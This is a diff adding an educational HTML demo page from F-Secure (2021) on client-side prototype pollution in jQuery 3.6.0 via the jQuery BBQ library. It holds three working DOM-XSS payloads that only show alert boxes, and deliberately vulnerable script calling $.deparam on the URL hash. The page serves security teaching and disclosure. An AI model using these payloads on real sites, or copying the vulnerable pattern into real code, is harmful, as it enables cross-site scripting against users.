@@ -1,0 +1,185 @@
+<html>
+
+<!-- calling jQuery and bbq from the web -->
+<!-- <script src=https://code.jquery.com/jquery-3.6.0.js></script>
+<script src="https://raw.githack.com/cowboy/jquery-bbq/master/jquery.ba-bbq.js"></script> -->
+
+
+<!-- calling jQuery and bbq from a file -->
+<!-- we did not create nor modify these files.
+They are the originals, and we retrieved them from:
+https://github.com/cowboy/jquery-bbq/blob/master/jquery.ba-bbq.js
+and
+https://code.jquery.com/jquery-3.6.0.js
+-->
+
+<script src="jquery-3.6.0.js"></script>
+<script src="jquery.ba-bbq.js"></script>
+
+
+<!-- uncomment this to freeze the object prototype and prevent pollution -->
+<!-- <script>Object.freeze(Object.prototype)</script> -->
+
+<h1> jQuery Prototype Pollution Demo</h1>
+Ben Berkowitz and Phil Sofia <br>
+F-Secure, 2021
+<br>
+<br>
+
+
+Big Thanks to Sergey Bobrov, whose
+<a href="https://github.com/BlackFan/client-side-prototype-pollution">
+client-side Prototype Pollution</a> repository <br>
+was the source of all the payloads we used on this page.
+
+<br>
+<br>
+
+<h3> Proto Pollution Payloads Table </h3>
+
+<table border=1 width=75%>
+<tr>
+<td><b>Function(s) Affected</b></td>
+<td><b>Payload</b></td>
+</tr>
+<tr>
+<td>$.ajax on objects, $.get. $.post, etc. </td>
+<td><code>#__proto__[url][]=data:,alert(123)//&__proto__[dataType]=script</code></td>
+</tr>
+
+<tr>
+<td>(x).off(...)   </td>
+<td><code>
+#__proto__[preventDefault]=x&amp;__proto__[handleObj]=x&amp;__proto__[delegateTarget]=&lt;img/src/onerror%3dalert(456)&gt;</code></td>
+</tr>
+
+<tr>
+<td>$(html) </td>
+<td><code>#__proto__[div][1]=&lt;img src onerror%3dalert(789)&gt;</code></td>
+</tr>
+</table>
+
+<br>
+<br>
+
+This page is vulnerable to multiple exploitation gadgets that affect jQuery<br>
+v.3.6.0, the most recent version at the time of writing. We've selected three<br>
+payloads and included them in the table above. All three payloads produce <br>
+DOM-based Cross-Site Scripting and show a harmless alert window for <br>
+demonstrative purposes.
+
+<br>
+<br>
+
+To see each one in action, append the respective payloads one at a time to <br>
+the URL bar, including the # character, like so: <br> <br>
+
+<code> prototypePollution-demo.html#PAYLOAD </code>
+
+<br>
+<br>
+Paste the payload into the URL bar, then refresh the page.
+
+<br>
+<br>
+
+<h3> How does this work? </h3>
+
+Prototype pollution occurs when user-supplied data is insecurely handled by<br>
+client-side code in such a way that data prototypes are affected. <br> This
+pollution of data prototypes can result in a security impact, often Cross-Site scripting.
+
+<br>
+<br>
+
+There are two components to impactful prototype pollution. First, an application <br>
+needs to execute code that pollutes the prototype. Next, it must call a function <br>
+that processes a polluted object in a way that produces exploitation.
+
+<br>
+<br>
+
+<h4>Polluting the Prototype</h4>
+
+The pollution on this page occurs due to
+<a href="https://github.com/cowboy/jquery-bbq">jQueryBBQ,</a> a third-party
+jQuery extension library<br>
+which provides Back Button and Query (BBQ) features. While this library was last<br>
+updated in 2010, it can still be found in applications to this day. <br>
+BBQ's <code>$.deparam()</code> function converts the page's URL hash parameters into objects.
+
+<br> When a user supplies this function with the right payloads,
+<code>deparam()</code> will alter <code>Object.prototype</code>.
+
+<br>
+<br>
+The line that causes prototype pollution via URL hash in the &lt;script&gt; tags below is:
+<br>
+<br>
+<code>
+var urlHash = $.deparam(location.hash.slice(1));
+</code>
+
+<h4>Calling Vulnerable Functions</h4>
+
+This page calls three functions from jQuery that execute the code injected into<br>
+<code>Object.prototype</code> during pollution. These three functions are
+present and vulnerable <br> in the most recent version of jQuery (3.6.0 at the time
+of this writing).
+
+<br>
+<br>
+
+Each of the three functions shown in the table above has a purpose, but in our<br>
+blog post we went into detail on <code>$.ajax</code> and a few of its related<br>
+functionalities in the context of prototype pollution.
+
+<br>
+<br>
+
+
+<script>
+
+  // This line calls jQuery BBQ's deparam function,
+  // which results in proto pollution if the URL's hash contains the right payload
+
+ var urlHash = $.deparam(location.hash.slice(1));
+
+
+
+  // ---- ajax gadget ---
+  // We spent time reverse engineering this payload
+
+ // $.getScript('localhost');
+ // $.get('localhost');
+ // $.post('localhost');
+ // $.getJSON('localhost');
+
+ // ajax does not produce DOM-XSS without an Object
+ //$.ajax('localhost');
+
+
+ $.ajax({
+       url: 'localhost',
+       cache: 'false',
+       // For the payload to work, we need url and at least one other property
+       // cache is optional, the property could even be aaa : 'aaa'
+  });
+
+
+
+  // ---- $(x).off(...) gadget ---
+  // #__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(123)>
+
+  //Uncomment the next line to make the page vulnerable to the $(x).off() type
+  $(document).off('abc123');
+
+
+
+   //--- $(html) gadget ---
+   // #__proto__[div][1]=<img src onerror%3dalert(123)>
+
+   $('<div x="x"></div>');
+</script>
+
+</html>
